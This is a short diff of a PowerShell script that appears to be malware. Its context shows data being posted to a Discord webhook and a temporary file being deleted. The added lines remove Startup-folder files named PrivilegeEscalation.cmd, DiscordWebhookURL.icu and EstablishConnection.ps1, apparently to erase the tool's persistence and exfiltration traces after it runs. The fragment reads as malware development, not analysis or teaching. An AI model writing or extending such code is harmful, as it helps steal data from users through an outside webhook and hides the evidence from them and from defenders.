@@ -100,3 +100,12 @@ Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body
 
 # Delete the text file
 Remove-Item -Path $TextFile
+
+$PrivilegeEscalationFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd"
+Remove-Item -Path $PrivilegeEscalationFilePath
+
+$DiscordWebhookURLFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\DiscordWebhookURL.icu"
+Remove-Item -Path $DiscordWebhookURLFilePath
+
+$EstablishConnectionFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\EstablishConnection.ps1"
+Remove-Item -Path $EstablishConnectionFilePath
